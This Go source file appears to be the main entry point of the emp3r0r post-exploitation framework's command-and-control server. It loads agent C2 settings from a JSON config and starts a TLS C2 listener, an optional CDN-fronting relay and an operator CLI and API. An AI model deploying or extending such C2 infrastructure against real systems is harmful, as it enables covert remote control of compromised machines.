package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/cc"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
)

// Config change cc's configuration at runtime
type Config struct {
	Version       string `json:"version"`
	SSHDPort      string `json:"sshd_port"`
	BroadcastPort string `json:"broadcast_port"`
	ProxyPort     string `json:"proxy_port"`
	CCPort        string `json:"cc_port"`
	CCIP          string `json:"ccip"`
	CA            string `json:"ca"`
}

func readJSONConfig(filename string) (err error) {
	// read JSON
	jsonData, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Fatal(err)
	}

	// parse the json
	var config Config
	err = json.Unmarshal(jsonData, &config)
	if err != nil {
		return fmt.Errorf("failed to decrypt JSON config: %v", err)
	}
	log.Printf("Read config data: %v", config)

	// set up runtime vars
	agent.Version = config.Version
	agent.SSHDPort = config.SSHDPort
	agent.BroadcastPort = config.BroadcastPort
	agent.ProxyPort = config.ProxyPort
	agent.CCPort = config.CCPort
	agent.CCAddress = fmt.Sprintf("https://%s", config.CCIP)

	// CA
	tun.CACrt = []byte(config.CA)

	return
}

func main() {
	go cc.TLSServer()

	cdnproxy := flag.String("cdn2proxy", "", "Start cdn2proxy server on this port")
	config := flag.String("config", "build.json", "Use this config file to update hardcoded variables")
	apiserver := flag.Bool("api", false, "Run API server in background, you can send commands to /tmp/emp3r0r.socket")
	flag.Parse()

	// read config file
	err := readJSONConfig(*config)
	if err != nil {
		log.Printf("Read config: %s", err)
	}

	if *cdnproxy != "" {
		go func() {
			logFile, err := os.OpenFile("/tmp/ws.log", os.O_CREATE|os.O_RDWR, 0600)
			if err != nil {
				log.Fatal(err)
			}
			err = cdn2proxy.StartServer(*cdnproxy, "127.0.0.1:"+agent.CCPort, logFile)
			if err != nil {
				log.Fatal(err)
			}
		}()
	}

	err = cc.CliBanner()
	if err != nil {
		log.Fatal(err)
	}

	// use emp3r0r in terminal or from other frontend
	if *apiserver {
		go cc.APIMain()
	}
	cc.CliMain()
}
